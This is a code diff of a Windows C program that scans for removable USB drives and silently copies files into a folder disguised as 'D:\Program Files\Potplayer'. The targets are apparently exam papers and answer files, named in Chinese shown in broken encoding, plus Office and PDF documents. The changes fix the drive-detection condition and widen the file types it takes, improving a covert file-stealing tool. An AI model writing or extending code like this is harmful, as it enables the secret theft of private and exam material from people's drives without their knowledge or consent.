@@ -31,7 +31,7 @@ int main(int argc, TCHAR* argv[])
 		int removebleNumber = 0;
 		diskNumber = getDirName(diskName);
 		removebleNumber = getAllDirRemoveble(diskName, removebleDiskName, diskNumber);
-		if (!removebleNumber)
+		if (removebleNumber!=0)
 		{
 			for (int i = 0; i < removebleNumber; i++)
 			{
@@ -192,7 +192,7 @@ void copyFile(const TCHAR* dirName)
 
 	convertsCharToTCHAR(find.name, fileName);
 
-	if (strstr(fileName, TEXT("ÊÔ¾í")) != NULL || strstr(fileName, TEXT("ppt")) != NULL || strstr(fileName, TEXT("doc")) != NULL || strstr(fileName, TEXT("´ð°¸")) != NULL || strstr(fileName, TEXT("txt")) != NULL)
+	if (strstr(fileName, TEXT("ÊÔ¾í")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("´ð°¸")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
 	{
 		wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
 		wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
@@ -211,7 +211,7 @@ void copyFile(const TCHAR* dirName)
 					continue;
 			convertsCharToTCHAR(find.name, fileName);
 
-			if (strstr(fileName, TEXT("ÊÔ¾í")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("´ð°¸")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL)
+			if (strstr(fileName, TEXT("ÊÔ¾í")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("´ð°¸")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
 			{
 				wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
 				wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
